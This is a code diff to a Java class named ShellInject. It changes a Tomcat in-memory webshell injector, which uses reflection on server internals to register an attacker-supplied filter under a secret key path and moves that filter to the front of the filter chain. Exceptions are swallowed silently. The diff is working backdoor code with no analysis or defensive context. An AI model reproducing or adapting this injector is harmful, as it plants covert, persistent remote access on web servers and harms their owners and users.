@@ -12,6 +12,8 @@ import org.apache.tomcat.util.descriptor.web.FilterMap;
 
 import javax.servlet.DispatcherType;
 import javax.servlet.Filter;
+import javax.servlet.Servlet;
+import java.lang.reflect.Field;
 
 public class ShellInject  {
     static {
@@ -21,30 +23,35 @@ public class ShellInject  {
             contextField.setAccessible(true);
             org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(webappClassLoaderBase.getResources().getContext());
             Filter filter = (Filter) applicationContext.getAttribute("litchi");
-
+            StandardContext standardContext = ((StandardContext)webappClassLoaderBase.getResources().getContext());
+            String key = (String) filter.getClass().getField("key").get(filter);
             FilterDef filterDef = new FilterDef();
-            filterDef.setFilterName("litchi");
+            filterDef.setFilterName(key);
             filterDef.setFilterClass(filter.getClass().getName());
             filterDef.setFilter(filter);
-            StandardContext standardContext = ((StandardContext)webappClassLoaderBase.getResources().getContext());
             standardContext.addFilterDef(filterDef);
             standardContext.filterStart();
             org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
             FilterMap filterMap = new FilterMap();
-            filterMap.setFilterName("litchi");
+            filterMap.setFilterName(key);
             filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));
-            filterMap.addURLPattern("/*");
+            filterMap.addURLPattern("/"+key);
             standardContext.addFilterMap(filterMap);
+            Field filterMapsField = StandardContext.class.getDeclaredField("filterMaps");
+            filterMapsField.setAccessible(true);
+            Field arrayField = filterMapsField.get(standardContext).getClass().getDeclaredField("array");
+            arrayField.setAccessible(true);
             for (int i = 0; i < filterMaps.length; i++) {
-                if (filterMaps[i].getFilterName().equalsIgnoreCase("litchi")) {
-                    org.apache.tomcat.util.descriptor.web.FilterMap tempFilterMap = filterMaps[i];
+                if (filterMaps[i].getFilterName().equalsIgnoreCase(key)) {
                     filterMaps[i] = filterMaps[0];
                     filterMaps[0] = filterMap;
                     break;
                 }
             }
+            arrayField.set(filterMapsField.get(standardContext),filterMaps);
         } catch (Exception e) {
         }
     }
 
 }
+
